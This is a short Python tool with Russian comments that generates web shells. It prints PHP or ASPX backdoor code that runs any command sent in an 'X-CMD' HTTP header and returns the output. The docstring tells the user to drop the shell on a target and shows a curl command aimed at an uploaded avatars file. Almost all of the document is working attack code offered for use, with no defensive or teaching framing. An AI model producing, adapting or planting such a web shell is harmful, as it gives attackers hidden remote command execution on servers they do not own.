#!/usr/bin/env python3
"""webshell.py — минимальный управляемый шелл через HTTP-заголовок.
Кидаешь webshell.php на цель, дёргаешь так:
  curl -H "X-CMD: id" http://target/files/avatars/ws.php
Фича: вывод возвращается телом ответа, работает через allow_url_include-off и без GET-параметров."""
import argparse

PHP = r'''<?php
$h = $_SERVER['HTTP_X_CMD'] ?? '';
if ($h) { header('Content-Type: text/plain'); system($h); exit; }
?>'''

PS = r'''<%@ Page Language="C#" %>
<%
var c = Request.Headers["X-CMD"];
if (!string.IsNullOrEmpty(c)) { Response.ContentType = "text/plain";
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + c;
  p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;
  p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit(); }
%>'''

def main():
    p = argparse.ArgumentParser(
        description=__doc__.strip(),
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument('type', choices=['php', 'aspx'], help='какой шелл отдать в stdout')
    args = p.parse_args()
    print(PHP if args.type == 'php' else PS)

if __name__ == '__main__':
    main()
